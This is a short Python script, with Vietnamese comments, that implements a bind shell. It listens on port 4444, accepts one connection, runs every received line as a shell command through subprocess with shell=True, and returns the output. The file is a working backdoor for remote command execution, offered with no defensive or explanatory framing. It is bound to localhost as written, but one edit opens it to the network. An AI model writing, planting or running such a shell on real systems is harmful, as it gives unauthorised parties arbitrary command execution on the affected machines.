import socket
import subprocess

def run_command(command):
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = str(e).encode('utf-8')
    return output

def start_server():
    host = "127.0.0.1" # địa chỉ IP của máy chủ
    port = 4444 # cổng kết nối

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print("[*] Listening on {}:{}".format(host, port))

    conn, addr = server.accept()
    print("[*] Connection from {}:{}".format(addr[0], addr[1]))

    while True:
        try:
            data = conn.recv(1024).decode('utf-8').rstrip()
            if not data:
                break
            print("[*] Received command: {}".format(data))
            output = run_command(data)
            conn.sendall(output)
        except Exception as e:
            print(str(e))
            break

    conn.close()

if __name__ == '__main__':
    start_server()